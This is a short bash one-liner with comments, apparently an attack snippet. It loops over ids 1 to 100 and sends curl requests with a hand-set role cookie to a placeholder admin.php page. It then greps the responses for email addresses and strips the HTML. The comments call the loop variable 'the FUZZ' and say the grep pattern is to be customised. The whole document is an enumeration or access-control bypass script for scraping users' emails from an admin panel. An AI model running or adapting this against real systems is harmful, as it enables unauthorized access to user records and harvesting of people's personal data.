for i in {1..100}; do echo "===" $i "==="; curl -s -b "user=some; role=cookies" "http://ip/xxx/admin.php?content=xx&id="$i | grep --color=no -i email | sed -e 's/<[^>]*>/ /g;s/Access ID  Name//g;s/Email//g;s/^[ ]*//;s/[ ]*$//'; done

# $i is the FUZZ
# grep email etc. are the things need to be customized